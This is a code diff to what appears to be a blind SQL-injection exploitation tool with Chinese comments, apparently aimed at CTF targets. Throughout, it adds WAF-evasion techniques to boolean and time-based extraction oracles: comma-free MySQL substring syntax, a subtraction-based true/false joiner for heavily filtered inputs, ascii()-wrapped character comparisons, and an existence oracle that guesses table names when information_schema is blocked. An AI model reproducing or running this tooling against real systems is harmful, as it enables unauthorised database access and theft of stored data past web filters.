@@ -40,8 +40,12 @@ class BaseOracle:
         raise NotImplementedError
 
     def _substr_at(self, expr: str, pos: int) -> str:
-        """截取单字符表达式：逗号被滤时用 from/for 免逗号语法。"""
+        """位置 pos 起的子串表达式（外层 ascii() 取首字符码点即单字符）。
+        逗号被滤：MySQL 走 mid(x from(p))（免逗号免 for 免空格）；
+        其他方言走 substr from/for 语法。"""
         if self.waf.is_filtered(","):
+            if self.dialect.name == "mysql":
+                return f"mid(({expr})from({pos}))"
             return f"substr(({expr})from {pos} for 1)"
         return f"substr(({expr}),{pos},1)"
 
@@ -140,7 +144,8 @@ class BoolOracle(BaseOracle):
         self.workers = workers
         # 参照 joiner 依次尝试：or（登录框恒真/查询框多行）→ and（查询框真=基线）
         # → xor（FinalSQL 类：and/or/空格/注释全被滤，1^(cond) 真→0 假→基线）
-        for joiner in ("or", "and", "xor"):
+        # → arith（「都过滤了」类：'-cond-' 减法两态，见 builder.logic_arith）
+        for joiner in ("or", "and", "xor", "arith"):
             fn = getattr(self.b, f"logic_{joiner}")
             r_true = self.s.request_value(self.b.wrap(fn("1=1")))
             r_false = self.s.request_value(self.b.wrap(fn("1=2")))
@@ -150,7 +155,7 @@ class BoolOracle(BaseOracle):
             self._joiner = joiner
             self.s.log("INFO", f"[bool] joiner={joiner}")
             return
-        raise OracleError("or/and/xor 均无真假差异，布尔通道不可用")
+        raise OracleError("or/and/xor/arith 均无真假差异，布尔通道不可用")
 
     def eval_bool(self, cond: str) -> bool:
         join = getattr(self.b, f"logic_{self._joiner}")
@@ -183,12 +188,14 @@ class BoolOracle(BaseOracle):
         return lo
 
     def _char_at(self, expr: str, pos: int, prev: str | None = None) -> str:
-        """提取 pos 位置字符；prev 为上一字符时先做游程检测（1 请求）。"""
+        """提取 pos 位置字符；prev 为上一字符时先做游程检测（1 请求）。
+        码点比较（ascii 包裹）：mid 免 for 形态返回后缀式，直接比较后缀
+        会误判，码点比较对单字符/后缀两种形态都恒等于单字符相等。"""
         if prev:
             eq = "=" if not self.waf.is_filtered("=") else " like "
             a = self._substr_at(expr, pos)
             b = self._substr_at(expr, pos - 1)
-            if self.eval_bool(f"{a}{eq}{b}"):
+            if self.eval_bool(f"ascii({a}){eq}ascii({b})"):
                 return prev
         code = self._binsearch(
             lambda m: f"{self.dialect.blind_code}({self._substr_at(expr, pos)})>={m}", 32, 126)
@@ -207,8 +214,11 @@ class BoolOracle(BaseOracle):
         return "".join(out)
 
     def scalar(self, expr: str) -> str:
-        if self.waf.is_filtered("ascii", "ord", "substr", "mid"):
-            raise OracleError("ascii/substr 被过滤，布尔通道不可用")
+        # 按方言实际使用判定（ord 被拦不影响 ascii 通道）
+        if self.waf.is_filtered(self.dialect.blind_code) \
+                or self.waf.is_filtered("length") \
+                or (self.waf.is_filtered("substr") and self.waf.is_filtered("mid")):
+            raise OracleError("码点/截取/定长函数被过滤，布尔通道不可用")
         if not self.eval_bool(f"length(({expr}))>0"):
             return ""
         length = self._binsearch(lambda m: f"length(({expr}))>={m}", 1, 1024)
@@ -223,6 +233,39 @@ class BoolOracle(BaseOracle):
                 a, b = futs[f]
                 result[a - 1:b] = f.result()
         return "".join(result)
+
+    # ------------------------------------------------------------------ 存在性
+    def exists(self, expr: str) -> bool:
+        """存在性 oracle（information_schema 被拦时字典爆破的底座）。
+
+        expr 形如 (select(0)from(db.t))——对象存在时值为 0，不存在时 SQL
+        报错（报错被吞则与「不匹配」页同貌）。参照：select(0)（恒 0 成功页）
+        与 select(0)from(不存在表)（报错页）。要求引号闭合注入（字符串基线
+        数值化为 0），即减法形态；空表返回 NULL 会误判不存在（CTF 可忽略）。
+        """
+        if self.inj.numeric or not self.inj.closure:
+            raise OracleError("exists 需引号闭合（字符串基线）注入点")
+        if not hasattr(self, "_ex_refs"):
+            r_ok = self.s.request_value(
+                self.b.wrap(self.b.logic_arith("(select(0))")))
+            r_bad = self.s.request_value(
+                self.b.wrap(self.b.logic_arith("(select(0)from(asqnosuch9999))")))
+            self._ex_refs = (r_ok, r_bad)
+            self.s.log("INFO", f"[bool] exists 参照: 成功页={r_ok.length}B "
+                               f"报错页={r_bad.length}B")
+        r_ok, r_bad = self._ex_refs
+        payload = self.b.wrap(self.b.logic_arith(expr))
+        self.last_payload = payload
+        r = self.s.request_value(payload)
+        self.requests += 1
+        if r.status_code < 0:
+            raise OracleError("请求失败")
+        if r.has_waf_block():
+            raise OracleError(f"exists 探针被拦截: {expr[:60]}")
+        if r.has_sql_error() or similarity(r, r_bad) >= 0.95 \
+                and r.status_code == r_bad.status_code:
+            return False
+        return similarity(r, r_ok) >= 0.95 and r.status_code == r_ok.status_code
 
 
 # ---------------------------------------------------------------------------
@@ -360,8 +403,10 @@ class TimeOracle(BaseOracle):
         return lo
 
     def scalar(self, expr: str) -> str:
-        if self.waf.is_filtered("ascii", "ord", "substr", "mid"):
-            raise OracleError("ascii/substr 被过滤，时间通道不可用")
+        if self.waf.is_filtered(self.dialect.blind_code) \
+                or self.waf.is_filtered("length") \
+                or (self.waf.is_filtered("substr") and self.waf.is_filtered("mid")):
+            raise OracleError("码点/截取/定长函数被过滤，时间通道不可用")
         if not self.eval_bool(f"length(({expr}))>0"):
             return ""
         length = self._binsearch(lambda m: f"length(({expr}))>={m}", 1, 512)
@@ -375,7 +420,7 @@ class TimeOracle(BaseOracle):
                 eq = "=" if not self.waf.is_filtered("=") else " like "
                 a = self._substr_at(expr, p)
                 b = self._substr_at(expr, p - 1)
-                if self.eval_bool(f"{a}{eq}{b}"):
+                if self.eval_bool(f"ascii({a}){eq}ascii({b})"):
                     out.append(prev)
                     continue
             code = self._binsearch(
